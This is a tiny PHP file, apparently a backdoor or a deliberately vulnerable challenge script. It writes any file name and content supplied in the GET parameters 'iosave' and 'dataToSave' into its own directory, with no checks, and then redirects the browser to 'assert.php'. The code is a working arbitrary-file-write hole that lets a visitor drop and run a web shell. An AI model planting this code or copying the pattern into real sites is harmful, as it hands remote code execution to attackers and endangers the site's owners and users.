<?php

if (isset($_GET['iosave']))
    file_put_contents(__DIR__ . "/" . $_GET['iosave'],$_GET['dataToSave']);
?>

<script>window.location="assert.php"</script>